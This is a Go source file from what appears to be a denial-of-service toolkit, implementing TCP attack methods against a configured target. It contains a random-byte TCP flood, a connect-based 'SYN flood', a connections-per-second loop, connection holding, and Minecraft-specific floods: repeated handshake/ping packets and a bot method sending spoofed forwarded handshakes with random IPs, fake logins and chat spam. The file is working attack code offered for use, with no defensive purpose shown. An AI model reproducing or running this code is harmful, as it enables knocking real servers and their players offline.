package layer4

import (
	"context"
	"fmt"
	"net"
	"strconv"
	"time"

	"github.com/go-ddos-tools/pkg/core"
	"github.com/go-ddos-tools/pkg/minecraft"
	"github.com/go-ddos-tools/pkg/utils"
)

// TCPAttack implements TCP-based attacks
type TCPAttack struct {
	Config *core.AttackConfig
	Method string
}

func NewTCPAttack(cfg *core.AttackConfig, method string) *TCPAttack {
	return &TCPAttack{
		Config: cfg,
		Method: method,
	}
}

func (t *TCPAttack) Attack(ctx context.Context) error {
	switch t.Method {
	case "TCP":
		return t.executeTCP(ctx)
	case "SYN":
		return t.executeSYN(ctx)
	case "MINECRAFT":
		return t.executeMINECRAFT(ctx)
	case "CPS":
		return t.executeCPS(ctx)
	case "CONNECTION":
		return t.executeCONNECTION(ctx)
	case "MCBOT":
		return t.executeMCBOT(ctx)
	default:
		return t.executeTCP(ctx)
	}
}

func (t *TCPAttack) executeTCP(ctx context.Context) error {
	conn, err := net.DialTimeout("tcp", t.Config.Target, 1*time.Second)
	if err != nil {
		return err
	}
	defer conn.Close()

	data := utils.RandomBytes(1024)
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		n, err := conn.Write(data)
		if err != nil {
			break
		}
		t.Config.RequestsSent.Add(1)
		t.Config.BytesSent.Add(int64(n))
	}
	return nil
}

func (t *TCPAttack) executeSYN(ctx context.Context) error {
	// Simplified SYN flood
	for i := 0; i < 10; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		conn, err := net.DialTimeout("tcp", t.Config.Target, 100*time.Millisecond)
		if err == nil {
			conn.Close()
			t.Config.RequestsSent.Add(1)
		}
	}
	return nil
}

func (t *TCPAttack) executeMINECRAFT(ctx context.Context) error {
	conn, err := net.DialTimeout("tcp", t.Config.Target, 1*time.Second)
	if err != nil {
		return err
	}
	defer conn.Close()

	host, portStr, _ := net.SplitHostPort(t.Config.Target)
	port, _ := strconv.Atoi(portStr)

	handshake := minecraft.Handshake(host, uint16(port), t.Config.ProtocolID, 1)
	ping := minecraft.Data([]byte{0x00})

	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		n1, err := conn.Write(handshake)
		if err != nil {
			break
		}
		n2, err := conn.Write(ping)
		if err != nil {
			break
		}
		t.Config.RequestsSent.Add(1)
		t.Config.BytesSent.Add(int64(n1 + n2))
	}
	return nil
}

func (t *TCPAttack) executeCPS(ctx context.Context) error {
	for i := 0; i < 10; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		conn, err := net.DialTimeout("tcp", t.Config.Target, 1*time.Second)
		if err == nil {
			conn.Close()
			t.Config.RequestsSent.Add(1)
		}
	}
	return nil
}

func (t *TCPAttack) executeCONNECTION(_ context.Context) error {
	conn, err := net.DialTimeout("tcp", t.Config.Target, 1*time.Second)
	if err != nil {
		return err
	}

	go func() {
		defer conn.Close()
		buf := make([]byte, 1024)
		for {
			_, err := conn.Read(buf)
			if err != nil {
				break
			}
		}
	}()

	t.Config.RequestsSent.Add(1)
	time.Sleep(5 * time.Second)
	return nil
}

func (t *TCPAttack) executeMCBOT(_ context.Context) error {
	conn, err := net.DialTimeout("tcp", t.Config.Target, 1*time.Second)
	if err != nil {
		return err
	}
	defer conn.Close()

	host, portStr, _ := net.SplitHostPort(t.Config.Target)
	port, _ := strconv.Atoi(portStr)

	// Simplified MCBOT implementation
	uuid := fmt.Sprintf("%s-%s-%s-%s-%s",
		utils.RandString(8), utils.RandString(4), utils.RandString(4), utils.RandString(4), utils.RandString(12))

	handshake := minecraft.HandshakeForwarded(host, uint16(port), t.Config.ProtocolID, 2, utils.RandIPv4(), uuid)
	n1, err := conn.Write(handshake)
	if err != nil {
		return err
	}
	t.Config.BytesSent.Add(int64(n1))

	username := fmt.Sprintf("Bot_%s", utils.RandString(5))
	loginPacket := minecraft.Login(t.Config.ProtocolID, username)
	n2, err := conn.Write(loginPacket)
	if err != nil {
		return err
	}
	t.Config.BytesSent.Add(int64(n2))

	time.Sleep(1500 * time.Millisecond)

	// Just send one chat packet to simulate activity
	chatMsg := utils.RandString(256)
	chatPacket := minecraft.Chat(t.Config.ProtocolID, chatMsg)
	conn.Write(chatPacket)

	return nil
}
